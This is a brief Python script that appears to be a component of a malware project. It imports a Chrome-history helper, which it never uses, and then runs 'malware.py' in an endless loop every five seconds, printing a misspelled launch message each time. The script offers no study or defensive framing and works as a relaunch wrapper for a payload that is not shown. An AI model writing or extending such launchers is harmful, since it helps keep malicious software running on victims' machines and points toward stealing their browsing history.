import time
import subprocess
from browser_utils import get_chrome_history



INTERVAL = 5

while True:
    print("[*] Lounching malware instance..")
    subprocess.run(["python3", "malware.py"])
    time.sleep(INTERVAL)